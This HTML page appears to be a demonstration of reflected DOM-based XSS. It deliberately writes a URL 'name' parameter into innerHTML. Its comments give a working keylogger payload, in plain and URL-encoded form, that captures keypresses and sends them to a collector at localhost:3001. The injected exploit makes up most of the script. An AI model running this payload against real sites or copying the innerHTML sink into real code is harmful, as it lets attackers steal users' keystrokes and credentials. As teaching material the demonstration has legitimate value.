<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>keystrokes</title>
 </head>
 <body>
 
 <!-- Vulnerable Code -->
 <div>
     Welcome, <span id="username"></span>!
  </div>
 
 <script>
     // Function to set a cookie, mostly this will be set from server
     function setCookie(name, value, days) {
         const date = new Date();
         date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
         const expires = "expires=" + date.toUTCString();
         document.cookie = name + "=" + value + ";" + expires + ";path=/";
     }
 
     // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
     setCookie("exampleCookie", "Hello, Cookie!", 7);
 </script>
 
 <!-- Vulnerable Code -->
 <script>
     const params = new URLSearchParams(window.location.search);
     const name = params.get('name');
     document.getElementById('username').innerHTML = name;

     //attacker code
     //<img src="does-not-exist" onerror="var timeout; var buffer= \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event){if(event.which!==0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout=setTimeout(function(){var xhr = new XMLHttpRequest(); var uri=\'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffee=\'\'; },400);}});">
     // ?name=<img%20src%3D"does-not-exist"%20onerror%3D"var%20timeout%3B%20var%20buffer%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%7Bif(event.which!%3D%3D0)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%3DsetTimeout(function()%7Bvar%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%3D%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffee%3D%27%27%3B%20%7D%2C400)%3B%7D%7D)%3B">
  </script>
 
 </body>
 </html>